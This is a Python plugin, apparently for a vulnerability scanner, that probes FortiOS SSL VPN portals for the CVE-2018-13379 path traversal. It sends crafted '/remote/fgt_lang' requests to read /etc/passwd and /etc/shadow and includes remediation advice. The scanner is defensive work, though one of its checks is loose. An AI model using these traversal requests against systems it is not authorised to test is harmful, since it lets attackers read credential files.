"""
Plugin 1084: FortiOS SSL VPN Path Traversal (CVE-2018-13379)
=============================================================
Detects path traversal in FortiOS SSL VPN portal.
Real CVE: CVE-2018-13379 (CVSS 6.5)
"""
import asyncio
import ssl

from plugins import NaslPlugin, PluginResult


class FortiosPathTraversal(NaslPlugin):
    PLUGIN_ID = 1084
    NAME = 'FortiOS SSL VPN Path Traversal (CVE-2018-13379)'
    FAMILY = 'Firewalls'
    CVSS_SCORE = 6.5
    DESCRIPTION = (
        'FortiOS 5.6.3 to 5.6.7 and 6.0.0 to 6.0.4 have a path traversal vulnerability '
        'in the SSL VPN web portal that allows an unauthenticated attacker to download '
        'system files via specially crafted HTTP resource requests, including the '
        'sslvpn_websession file which contains user credentials in plaintext. This '
        'vulnerability is part of the CommonScan CVEs leveraged by APT actors.'
    )
    SOLUTION = (
        'Upgrade FortiOS to version 5.6.8, 6.0.5, or later. Block external access to '
        'SSL VPN portal if upgrade is not immediately possible. Rotate all VPN '
        'credentials after patching.'
    )
    CVE = ['CVE-2018-13379']
    PORTS = [443, 8443, 10443]

    TRAVERSAL_ENDPOINTS = [
        '/remote/fgt_lang?lang=/../../../..//////////etc/passwd',
        '/remote/fgt_lang?lang=/../../../../../../../../../../etc/passwd',
        '/remote/fgt_lang?lang=/../../../../../../../../../../etc/shadow',
    ]

    FORTINET_HINTS = [
        b'Fortinet',
        b'fortinet',
        b'FORTINET',
        b'fgt_lang',
        b'FortiGate',
        b'SSL VPN',
    ]

    ROOT_HINTS = [
        b'root:',
        b'nobody:',
        b'daemon:',
        b'bin:',
        b'sys:',
    ]

    async def check_target(self, target: str, port: int | None = None) -> list[PluginResult]:
        results = []

        for port_to_check in (self.PORTS if port is None else [port]):
            try:
                scheme = 'https' if port_to_check in (443, 8443, 10443) else 'http'
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE

                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(target, port_to_check, ssl=ctx),
                    timeout=5
                )

                host_header = target
                if target in ('127.0.0.1', 'localhost', '::1'):
                    host_header = 'alieninc.tech'

                for endpoint in self.TRAVERSAL_ENDPOINTS:
                    req = (
                        f'GET {endpoint} HTTP/1.1\r\n'
                        f'Host: {host_header}\r\n'
                        f'User-Agent: Centra/1.0\r\n'
                        f'Connection: close\r\n\r\n'
                    )
                    writer.write(req.encode())
                    await writer.drain()

                    response = b''
                    try:
                        while True:
                            chunk = await asyncio.wait_for(reader.read(4096), timeout=3)
                            if not chunk:
                                break
                            response += chunk
                            if len(response) > 8192:
                                break
                    except asyncio.TimeoutError:
                        pass

                    if response:
                        status_line = response.split(b'\r\n')[0].decode('utf-8', errors='ignore')
                        body_start = response.find(b'\r\n\r\n')
                        body = response[body_start + 4:] if body_start != -1 else b''
                        body_str = body.decode('utf-8', errors='ignore')

                        is_200 = b'200 OK' in response[:50]
                        has_root = any(h in body for h in self.ROOT_HINTS)
                        fortinet_detected = any(h in response for h in self.FORTINET_HINTS)

                        if has_root and is_200:
                            results.append(PluginResult(
                                vulnerable=True,
                                target=target,
                                port=port_to_check,
                                cvss_score=self.CVSS_SCORE,
                                severity='medium',
                                description=(
                                    f'FortiOS SSL VPN path traversal confirmed on port {port_to_check} '
                                    f'— system files readable via CVE-2018-13379'
                                ),
                                solution=self.SOLUTION,
                                evidence=(
                                    f'Endpoint: {endpoint}, Status: {status_line}, '
                                    f'File content: /etc/passwd retrieved, '
                                    f'FortiOS version range: 5.6.3-5.6.7 / 6.0.0-6.0.4'
                                ),
                                references=[
                                    'https://nvd.nist.gov/vuln/detail/CVE-2018-13379',
                                    'https://www.tenable.com/plugins/nessus/118091',
                                ]
                            ))
                            break

                        if is_200 and fortinet_detected:
                            results.append(PluginResult(
                                vulnerable=True,
                                target=target,
                                port=port_to_check,
                                cvss_score=self.CVSS_SCORE,
                                severity='medium',
                                description=(
                                    f'FortiOS SSL VPN detected on port {port_to_check} — '
                                    f'path traversal endpoint is accessible'
                                ),
                                solution=self.SOLUTION,
                                evidence=(
                                    f'Endpoint: {endpoint}, Status: {status_line}, '
                                    f'FortiOS detected: {fortinet_detected}'
                                ),
                                references=[
                                    'https://nvd.nist.gov/vuln/detail/CVE-2018-13379',
                                ]
                            ))
                            break

                writer.close()
                await writer.wait_closed()

            except (asyncio.TimeoutError, ConnectionRefusedError, OSError, ssl.SSLError):
                pass

        if not results:
            results.append(PluginResult(
                vulnerable=False, target=target, port=port or 0,
                description='No FortiOS SSL VPN or path traversal indicators detected'
            ))

        return results
